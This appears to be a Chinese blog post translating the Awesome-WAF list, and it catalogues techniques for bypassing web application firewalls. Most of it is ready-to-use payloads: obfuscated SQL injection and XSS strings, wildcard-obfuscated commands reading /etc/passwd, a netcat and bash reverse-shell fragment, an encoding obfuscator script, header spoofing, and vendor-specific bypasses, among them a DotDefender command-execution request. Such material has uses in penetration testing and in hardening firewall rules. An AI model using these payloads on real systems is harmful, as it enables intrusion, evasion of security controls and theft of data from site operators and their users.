---
layout: post
title: Awesome WAF 中文翻译、各种绕过手法
categories: waf
tag: waf
---
翻译文
> https://github.com/0xInfection/Awesome-WAF

## 绕过手法

### fuzz/爆破

- fuzz 字符串
  
  ```text
  12345'"\'\");|]*%00{%0d%0a<%00>%bf%27'ðŸ’¡
  ```
- 字典
    - [Seclists/Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
    - [Fuzz-DB/Attack](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack)
    - [Other Payloads](https://github.com/foospidy/payloads)
  可能会被ban ip，小心为妙。

### 正则绕过

多少waf 使用正则匹配。
#### 黑名单检测/bypass

__Case__: SQL 注入

##### • Step 1:
__过滤关键词__: `and`, `or`, `union`  
__可能正则__: `preg_match('/(and|or|union)/i', $id)`  
- __被拦截的语句__: `union select user, password from users`
- __bypass语句__: `1 || (select user from users where user_id = 1) = 'admin'`

##### • Step 2:
__过滤关键词__: `and`, `or`, `union`, `where`  
- __被拦截的语句__: `1 || (select user from users where user_id = 1) = 'admin'`
- __bypass语句__: `1 || (select user from users limit 1) = 'admin'`

##### • Step 3:
__过滤关键词__: `and`, `or`, `union`, `where`, `limit`  
- __被拦截的语句__: `1 || (select user from users limit 1) = 'admin'`
- __bypass语句__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`

##### • Step 4:
__过滤关键词__: `and`, `or`, `union`, `where`, `limit`, `group by`  
- __被拦截的语句__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
- __bypass语句__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`

##### • Step 5:
__过滤关键词__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`  
- __被拦截的语句__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
- __bypass语句__: `1 || 1 = 1 into outfile 'result.txt'`
- __bypass语句__: `1 || substr(user,1,1) = 'a'`

##### • Step 6:
__过滤关键词__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`  
- __被拦截的语句__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
- __bypass语句__: `1 || user_id is not null`
- __bypass语句__: `1 || substr(user,1,1) = 0x61`
- __bypass语句__: `1 || substr(user,1,1) = unhex(61)`

##### • Step 7:
__过滤关键词__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`  
- __被拦截的语句__: `1 || substr(user,1,1) = unhex(61)`
- __bypass语句__: `1 || substr(user,1,1) = lower(conv(11,10,36))`

##### • Step 8:
__过滤关键词__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`  
- __被拦截的语句__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
- __bypass语句__: `1 || lpad(user,7,1)`

##### • Step 9:
__过滤关键词__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`  
- __被拦截的语句__: `1 || lpad(user,7,1)`
- __bypass语句__: `1%0b||%0blpad(user,7,1)`

### 混淆 编码

__1. 大小写__

__标准__: `<script>alert()</script>`  
__Bypassed__: `<ScRipT>alert()</sCRipT>`

__标准__: `SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'`  
__Bypassed__: `sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'`

__2. URL 编码__  

__被阻断语句__: `<svG/x=">"/oNloaD=confirm()//`  
__Bypassed__: `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`

__被阻断语句__: `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`  
__Bypassed__: `uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`

__3. Unicode 编码__ 

__标准__: `<marquee onstart=prompt()>`  
__混淆__: `<marquee onstart=\u0070r\u06f\u006dpt()>`

__被阻断语句__: `/?redir=http://google.com`  
__Bypassed__: `/?redir=http://google。com` (Unicode 替代) 

__被阻断语句__: `<marquee loop=1 onfinish=alert()>x`  
__Bypassed__: `＜marquee loop＝1 onfinish＝alert︵1)>x` (Unicode 替代)

> __TIP:__ 查看这些说明 [this](https://hackerone.com/reports/231444) and [this](https://hackerone.com/reports/231389) reports on HackerOne. :)

__4. HTML 实体编码__

__标准__: `"><img src=x onerror=confirm()>`  
__Encoded__: `&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;` (General form)  
__Encoded__: `&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;` (Numeric reference)

__5. 混合编码__  
- Sometimes, WAF rules often tend to filter out a specific type of encoding.
- This type of filters can be bypassed by mixed encoding payloads.
- Tabs and newlines further add to obfuscation.

__混淆__: 
```
<A HREF="h
tt  p://6   6.000146.0x7.147/">XSS</A>
```
__7. 双重URL编码__

- 这个需要服务端多次解析了url编码

__标准__: `http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\`  
__混淆__: `http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\`

__标准__: `<script>alert()</script>`  
__混淆__: `%253Cscript%253Ealert()%253C%252Fscript%253E`

__8. 通配符使用__
- 用于linux命令语句注入，通过shell通配符绕过

__标准__: `/bin/cat /etc/passwd`  
__混淆__: `/???/??t /???/??ss??`  
Used chars: `/ ? t s`

__标准__: `/bin/nc 127.0.0.1 1337`  
__混淆__: `/???/n? 2130706433 1337`  
Used chars: `/ ? n [0-9]`

__9. 动态payload 生成__


__标准__: `<script>alert()</script>`  
__混淆__: `<script>eval('al'+'er'+'t()')</script>`

__标准__: `/bin/cat /etc/passwd`  
__混淆__: `/bi'n'''/c''at' /e'tc'/pa''ss'wd`
> Bash allows path concatenation for execution.

__标准__: `<iframe/onload='this["src"]="javascript:alert()"';>`  
__混淆__: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>`

__9. 垃圾字符__

- Normal payloads get filtered out easily.
- Adding some junk chars helps avoid detection (specific cases only).
- They often help in confusing regex based firewalls.

__标准__: `<script>alert()</script>`  
__混淆__: `<script>+-+-1-+-+alert(1)</script>`

__标准__: `<BODY onload=alert()>`  
__混淆__: ```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>```
> __NOTE:__ 上述语句可能会破坏正则的匹配，达到绕过。

__标准__: `<a href=javascript;alert()>ClickMe `  
__Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`

__10. 插入换行符__
- 部分waf可能会对换行符没有匹配

__标准__: `<iframe src=javascript:confirm(0)">`  
__混淆__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)">`

__11. 未定义变量__
- bash 和 perl 执行脚本中加入未定义变量，干扰正则。

> __TIP:__ 随便写个不存在的变量就好。`$aaaa,$sdayuhjbsad,$dad2ed`都可以。

- __Level 1 Obfuscation__: Normal  
__标准__: `/bin/cat /etc/passwd`  
__混淆__: `/bin/cat$u /etc/passwd$u`

- __Level 2 Obfuscation__: Postion Based  
__标准__: `/bin/cat /etc/passwd`  
__混淆__: `$u/bin$u/cat$u $u/etc$u/passwd$u`

- __Level 3 Obfuscation__: Random characters   
__标准__: `/bin/cat /etc/passwd`  
__混淆__: `$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff`

一个精心制作的payload
```
$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
```

__12. Tab 键和换行符__
- 大多数waf匹配的是空格不是Tab

__标准__: `<IMG SRC="javascript:alert();">`  
__Bypassed__: `<IMG SRC="    javascript:alert();">`  
__变形__: `<IMG SRC="    jav    ascri    pt:alert    ();">`

__标准__: `http://test.com/test?id=1 union select 1,2,3`  
__标准__: `http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3`

__标准__: `<iframe src=javascript:alert(1)></iframe>`  
__混淆__: 
```
<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
```

__13. Token Breakers(翻译不了 看起来说的就是sql注入闭合)__
- Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.
- Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.
- However, the request must still remain valid while using token-breakers.

- __Case__: Unknown Token for the Tokenizer  
    - __Payload__: `?id=‘-sqlite_version() UNION SELECT password FROM users --`  

- __Case__: Unknown Context for the Parser (Notice the uncontexted bracket)  
    - __Payload 1__: `?id=123);DROP TABLE users --`  
    - __Payload 2__: `?id=1337) INTO OUTFILE ‘xxx’ --`  

> __TIP:__ 更多payload可以看这里 [cheat sheet](https://github.com/attackercan/cpp-sql-fuzzer).


__14. 其他格式混淆__  
- 许多web应用程序支持不同的编码类型(如下表)
- 混淆成服务器可解析、waf不可解析的编码类型

__Case:__ IIS  
- IIS6, 7.5, 8 and 10 (ASPX v4.x) 允许 __IBM037__ 字符
- 可以发送编码后的参数名和值

原始请求:
```
POST /sample.aspx?id1=something HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 41

id2='union all select * from users--
```
混淆请求 + URL Encoding:
```
POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 115

%89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60
```

The following table shows the support of different character encodings on the tested systems (when messages could be 混淆 using them):
> __TIP:__ 可以使用 [这个小脚本](https://github.com/0xInfection/Awesome-WAF/blob/master/others/obfu.py) 来转化编码

```python
import urllib.parse, sys
from argparse import ArgumentParser
lackofart = '''
        OBFUSCATOR
'''

def paramEncode(params="", charset="", encodeEqualSign=False, encodeAmpersand=False, urlDecodeInput=True, urlEncodeOutput=True):
    result = ""
    equalSign = "="
    ampersand = "&"
    if '=' and '&' in params:
        if encodeEqualSign:
            equalSign = equalSign.encode(charset)
        if encodeAmpersand:
            ampersand = ampersand.encode(charset)
        params_list = params.split("&")
        for param_pair in params_list:
            param, value = param_pair.split("=")
            if urlDecodeInput:
                param = urllib.parse.unquote(param)
                value = urllib.parse.unquote(value)
            param = param.encode(charset)
            value = value.encode(charset)
            if urlEncodeOutput:
                param = urllib.parse.quote_plus(param)
                value = urllib.parse.quote_plus(value)
            if result:
                result += ampersand
            result += param + equalSign + value
    else:
        if urlDecodeInput:
            params = urllib.parse.unquote(params)
        result = params.encode(charset)
        if urlEncodeOutput:
            result = urllib.parse.quote_plus(result)
    return result

def main():
    print(lackofart)
    parser = ArgumentParser('python3 obfu.py')
    parser._action_groups.pop()

    # A simple hack to have required arguments and optional arguments separately
    required = parser.add_argument_group('Required Arguments')
    optional = parser.add_argument_group('Optional Arguments')

    # Required Options
    required.add_argument('-s', '--str', help='String to obfuscate', dest='str')
    required.add_argument('-e', '--enc', help='Encoding type. eg: ibm037, utf16, etc', dest='enc')

    # Optional Arguments (main stuff and necessary)
    optional.add_argument('-ueo', help='URL Encode Output', dest='ueo', action='store_true')
    optional.add_argument('-udi', help='URL Decode Input', dest='udi', action='store_true')
    args = parser.parse_args()
    if not len(sys.argv) > 1:
        parser.print_help()
        quit()
    print('Input: %s' % (args.str))
    print('Output: %s' % (paramEncode(params=args.str, charset=args.enc, urlDecodeInput=args.udi, urlEncodeOutput=args.ueo)))

if __name__ == '__main__':
    main()
```

| 服务器信息                    | 可用编码                                                                                                                                                                                                                                                                                                                                                        | 说明                                                                                                           |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Nginx, uWSGI-Django-Python3   | IBM037, IBM500, cp875, IBM1026, IBM273                                                                                                                                                                                                                                                                                                                          | 对参数名和参数值进行编码<br>服务器会对参数名和参数值均进行url解码<br>需要对等号和& and进行编码(不进行url编码)  |
| Nginx, uWSGI-Django-Python2   | IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424                                                                                                                                                                                                                                                                                                | 对参数名和参数值进行便慢慢<br>服务器会对参数名和参数值均进行url解码<br>等号和&符号不应该以任何方式编码。       |
| Apache-TOMCAT8-JVM1.8-JSP     | IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025                                                                                  | 参数名按原始格式(可以像往常一样使用url编码)<br>Body 不论是否经过url编码均可<br>等号和&符号不应该以任何方式编码 |
| Apache-TOMCAT7-JVM1.6-JSP     | IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025                                                                                          | 参数名按原始格式(可以像往常一样使用url编码)<br>Body 不论是否经过url编码均可<br>等号和&符号不应该以任何方式编码 |
| IIS6, 7.5, 8, 10 -ASPX (v4.x) | IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025 | 参数名按原始格式(可以像往常一样使用url编码)<br>Body 不论是否经过url编码均可<br>等号和&符号不应该以任何方式编码 |


### HTTP 参数污染

#### 手法
- 这种攻击方法基于服务器如何解释具有相同名称的参数
- 可能造成bypass的情况:
  - 服务器使用最后接收到的参数，WAF只检查第一个参数
  - 服务器将来自类似参数的值联合起来，WAF单独检查它们

下面是相关服务器对参数解释的比较

| 环境                          | 参数解析             | 示例             |
| ----------------------------- | -------------------- | ---------------- |
| ASP/IIS                       | 用逗号连接           | par1=val1,val2   |
| JSP, Servlet/Apache Tomcat    | 第一个参数是结果     | par1=val1        |
| ASP.NET/IIS                   | 用逗号连接           | par1=val1,val2   |
| PHP/Zeus                      | 最后一个参数是结果   | par1=val2        |
| PHP/Apache                    | 最后一个参数是结果   | par1=val2        |
| JSP, Servlet/Jetty            | 第一个参数是结果     | par1=val1        |
| IBM Lotus Domino              | 第一个参数是结果     | par1=val1        |
| IBM HTTP Server               | 最后一个参数是结果   | par1=val2        |
| mod_perl, libapeq2/Apache     | 第一个参数是结果     | par1=val1        |
| Oracle Application Server 10G | 第一个参数是结果     | par1=val1        |
| Perl CGI/Apache               | 第一个参数是结果     | par1=val1        |
| Python/Zope                   | 第一个参数是结果     | par1=val1        |
| IceWarp                       | 返回一个列表         | ['val1','val2']  |
| AXIS 2400                     | 最后一个参数是结果   | par1=val2        |
| DBMan                         | 由两个波浪号连接起来 | par1=val1~~val2  |
| mod-wsgi (Python)/Apache      | 返回一个列表         | ARRAY(0x8b9058c) |

### 浏览器 Bugs:
#### Charset Bugs:

- 可以尝试 修改 charset header to 更高的 Unicode (eg. UTF-32) 
- 当网站解码的时候，触发payload

Example request:
```
GET /page.php?p=∀㸀㰀script㸀alert(1)㰀/script㸀 HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Accept-Charset:utf-32; q=0.5<
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```
当站点加载时，将其编码为我们设置的UTF-32编码，然后由于页面的输出编码为UTF-8，将其呈现为:`"<script>alert (1) </ script>` 从而触发xss

完整url编码后的 payload:
```
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80 
```

#### Null 空字节

- 空字节通常用作字符串终止符

Payload 示例:
```
<scri%00pt>alert(1);</scri%00pt>
<scri\x00pt>alert(1);</scri%00pt>
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
```
__标准__: `<a href="javascript:alert()">`  
__混淆__: `<a href="ja0x09vas0x0A0x0Dcript:alert(1)">clickme</a>`  
__变形__: `<a 0x00 href="javascript:alert(1)">clickme</a>`

#### 解析错误

- RFC 声明节点名不可以由空白起始
- 但是我们可以使用特殊字符 ` %`, `//`, `!`, `?`, etc.

例子:
- `<// style=x:expression\28write(1)\29>`  - Works upto IE7 _([Source](http://html5sec.org/#71))_
- `<!--[if]><script>alert(1)</script -->` - Works upto IE9 _([Reference](http://html5sec.org/#115))_
- `<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>` - Works in IE7 _([Reference](http://html5sec.org/#77))_
- `<%div%20style=xss:expression(prompt(1))>` - Works Upto IE7


#### Unicode 分隔符
- 每个浏览器有不同的分隔分隔符

[@Masato Kinugawa](https://github.com/masatokinugawa)fuzz 后发现如下
- IExplorer: `0x09`, `0x0B`, `0x0C`, `0x20`, `0x3B`  
- Chrome: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`  
- Safari: `0x2C`, `0x3B`  
- FireFox: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`  
- Opera: `0x09`, `0x20`, `0x2C`, `0x3B`  
- Android: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B` 

示例
```
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
```

### 使用其他非典型等效语法结构替换

- 找的waf开发人员没有注意到的语句进行攻击

一些WAF开发人员忽略的常见关键字:
- JavaScript functions:
    - `window`
    - `parent`
    - `this`
    - `self`
- Tag attributes:
    - `onwheel`
    - `ontoggle`
    - `onfilterchange`
    - `onbeforescriptexecute`
    - `ondragstart`
    - `onauxclick`
    - `onpointerover`
    - `srcdoc`
- SQL Operators
    - `lpad`  
    ```
    lpad( string, padded_length, [ pad_string ] ) lpad函数从左边对字符串使用指定的字符进行填充
    lpad('tech', 7); 将返回' tech'
    lpad('tech', 2); 将返回'te'
    lpad('tech', 8, '0'); 将返回'0000tech'
    lpad('tech on the net', 15, 'z'); 将返回'tech on the net'
    lpad('tech on the net', 16, 'z'); 将返回'ztech on the net
    ```
    - `field` 
      ```
      FIELD(str,str1,str2,str3,...)
      返回的索引（从1开始的位置）的str在str1，str2，STR3，...列表中。如果str没有找到，则返回0。
      +---------------------------------------------------------+
      | FIELD('ej', 'Hej', 'ej', 'Heja', 'hej', 'foo')          |
      +---------------------------------------------------------+
      | 2                                                       |
      +---------------------------------------------------------+
      ```
    - `bit_count` 二进制数中包含1的个数。 BIT_COUNT(10);因为10转成二进制是1010，所以该结果就是2

示例payloads:
- __Case:__ XSS
```
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
```
- __Case:__ SQLi
```
SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
1%0b||%0bLPAD(USER,7,1)
```
可以使用许多替代原生JavaScript的方法:
- [JSFuck](http://www.jsfuck.com/)
- [JJEncode](http://utf-8.jp/public/jjencode.html)
- [XChars.JS](https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html)

### 滥用SSL/TLS密码:

- 很多时候，服务器可以接收各种SSL/TLS密码和版本的连接。
- 初始化到waf不支持的版本

- 找出waf支持的密码(通常WAF供应商文档对此进行了讨论)。
- 找出服务器支持的密码([SSLScan](https://github.com/rbsec/sslscan)这种工具可以帮助到你)。
- 找出服务器支持但waf不支持的


> __Tool__: [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) 


### 滥用 DNS 记录:

- 找到云waf后的源站

> __TIP:__  一些在线资源  [IP History](http://www.iphistory.ch/en/) 和 [DNS Trails](https://securitytrails.com/dns-trails)


__Tool__: [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)
```
bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
```

### 请求头欺骗

- 让waf以为请求来自于内部网络，进而不对其进行过滤。

添加如下请求头
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```



### Google Dorks Approach:

- 应对已知waf的绕过

#### 搜索语法

- Normal search:  
`+<wafname> waf bypass`

- Searching for specific version exploits:  
`"<wafname> <version>" (bypass|exploit)`

- For specific type bypass exploits:  
`"<wafname>" +<bypass type> (bypass|exploit)`

- On [Exploit DB](https://exploit-db.com):  
`site:exploit-db.com +<wafname> bypass`

- On [0Day Inject0r DB](https://0day.today):  
`site:0day.today +<wafname> <type> (bypass|exploit)`

- On [Twitter](https://twitter.com):  
`site:twitter.com +<wafname> bypass`

- On [Pastebin](https://pastebin.com)  
`site:pastebin.com +<wafname> bypass`


## 已知的bypass:


### Airlock Ergon
- SQLi Overlong UTF-8 Sequence Bypass (>= v4.2.4) by [@Sec Consult](https://www.exploit-db.com/?author=1614)
```
%C0%80'+union+select+col1,col2,col3+from+table+--+
```

### AWS
- [SQLi Bypass](https://github.com/enkaskal/aws-waf-sqli-bypass-PoC) by [@enkaskal](https://twitter.com/enkaskal)
```
"; select * from TARGET_TABLE --
```
- [XSS Bypass](https://github.com/kmkz/Pentesting/blob/master/Pentest-Cheat-Sheet#L285) by [@kmkz](https://twitter.com/kmkz_security)
```
<script>eval(atob(decodeURIComponent("payload")))//
```

### Barracuda 
- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
```
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
```
- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
```
GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
Host: favoritewaf.com
User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
```
- XSS Bypass by [@0xInfection](https://twitter.com/0xInfection)
```
<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
```
- [Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40146) by [@xort](https://www.exploit-db.com/?author=479#)
- [Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/40147) by [@xort](https://www.exploit-db.com/?author=479)

### Cerber (WordPress)
- Username Enumeration Protection Bypass by HTTP Verb Tampering by [@ed0x21son](https://www.exploit-db.com/?author=9901)
```
POST host.com HTTP/1.1
Host: favoritewaf.com
User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)

author=1
```
- Protected Admin Scripts Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
```
http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils
http://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar
```
- REST API Disable Bypass by [@ed0x21son](https://www.exploit-db.com/?author=9901)
```
http://host/index.php/wp-json/wp/v2/users/
```

### Citrix NetScaler
- SQLi via HTTP Parameter Pollution (NS10.5) by [@BGA Security](https://www.exploit-db.com/?author=7396)
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
        <string>’ union select current_user, 2#</string>
    </soapenv:Body>
</soapenv:Envelope>
```

- [`generic_api_call.pl` XSS](https://www.exploit-db.com/exploits/30777) by [@NNPoster](https://www.exploit-db.com/?author=6654)
```
http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
``` 

### Cloudflare
- [HTML Injection](https://twitter.com/spyerror/status/1161432029319376897) by [@spyerror](https://twitter.com/spyerror)
```
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
```
- [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
```
<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
```
- [XSS Bypasses](https://twitter.com/h1_ragnar) by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
```
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
1'"><img/src/onerror=.1|alert``>
```
- [XSS Bypass](https://twitter.com/RakeshMane10/status/1109008686041759744) by [@RakeshMane10](https://twitter.com/rakeshmane10)
```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```
- [XSS Bypass](https://twitter.com/ArbazKiraak/status/1090654066986823680) by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
```
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
```
- XSS Bypass by [@Ahmet Ümit](https://twitter.com/ahmetumitbayram)
```
<--`<img/src=` onerror=confirm``> --!>
```
- [XSS Bypass](https://twitter.com/le4rner/status/1146453980400082945) by [@Shiva Krishna](https://twitter.com/le4rner)
```
javascript:{alert`0`}
```
- [XSS Bypass](https://twitter.com/brutelogic/status/1147118371965755393) by [@Brute Logic](https://twitter.com/brutelogic)
```
<base href=//knoxss.me?
```
- [XSS Bypass](https://twitter.com/RenwaX23/status/1147130091031449601) by [@RenwaX23](https://twitter.com/RenwaX23) (Chrome only)
```
<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x 
```
- [RCE Payload Detection Bypass](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
```
cat$u+/etc$u/passwd$u
/bin$u/bash$u <ip> <port>
";cat+/etc/passwd+#
```

### Comodo 
- XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
```
<input/oninput='new Function`confir\u006d\`0\``'>
<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
```
- SQLi by [@WAFNinja](https://waf.ninja)
```
0 union/**/select 1,version(),@@datadir
```

### DotDefender
- Firewall disable by (v5.0) by [@hyp3rlinx](http://hyp3rlinx.altervista.org)
```
PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+
<enabled>false</enabled>
```
- Remote Command Execution (v3.8-5) by [@John Dos](https://www.exploit-db.com/?author=1996)
```
POST /dotDefender/index.cgi HTTP/1.1
Host: 172.16.159.132
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Authorization: Basic YWRtaW46
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

sitename=dotdefeater&deletesitename=dotdefeater;id;ls -al ../;pwd;&action=deletesite&linenum=15
```
- Persistent XSS (v4.0) by [@EnableSecurity](https://enablesecurity.com)
```
GET /c?a=<script> HTTP/1.1
Host: 172.16.159.132
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;
rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
<script>alert(1)</script>: aa
Keep-Alive: 300
```
- R-XSS Bypass by [@WAFNinja](https://waf.ninja)
```
<svg/onload=prompt(1);>
<isindex action="javas&tab;cript:alert(1)" type=image>
<marquee/onstart=confirm(2)>
```
- XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
```
<p draggable=True ondragstart=prompt()>alert
<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
```
